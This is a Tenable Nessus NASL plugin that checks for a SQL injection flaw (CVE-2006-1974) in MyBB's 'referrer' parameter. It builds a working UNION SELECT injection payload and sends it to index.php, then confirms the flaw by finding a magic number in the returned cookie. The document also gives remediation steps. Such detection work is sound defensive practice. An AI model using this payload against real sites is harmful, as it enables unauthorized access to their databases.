#
# (C) Tenable Network Security
#


if (description) {
  script_id(20838);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-1974");
  script_bugtraq_id(16443);

  script_name(english:"MyBB referrer Parameter SQL Injection Vulnerability");
  script_summary(english:"Checks for referrer parameter SQL injection vulnerability in MyBB");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is vulnerable to SQL
attacks. 

Description :

The installed version of MyBB fails to validate user input to the
'referrer' parameter before using it in the 'globals.php' script to
construct database queries.  An unauthenticated attacker can leverage
this issue to disclose sensitive information, modify data, or launch
attacks against the underlying database. 

See also :

http://community.mybboard.net/showthread.php?tid=6777

Solution : 

Edit 'inc/settings.php' and set 'usereferrals' to 'no'. Or upgrade to
MyBB version 1.0.4 or later.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


magic = rand();
exploit = string("UNION SELECT ", magic,  ",2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9/*");


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit flaw.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "referrer=", rand() % 100, "'+", urlencode(str:exploit)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # There's a problem if we see our magic number in the referrer cookie.
  if (egrep(pattern:string("^Set-Cookie: +mybb\\[referrer\\]=", magic), string:res, icase:TRUE)) {
    security_warning(port);
    exit(0);
  }
}
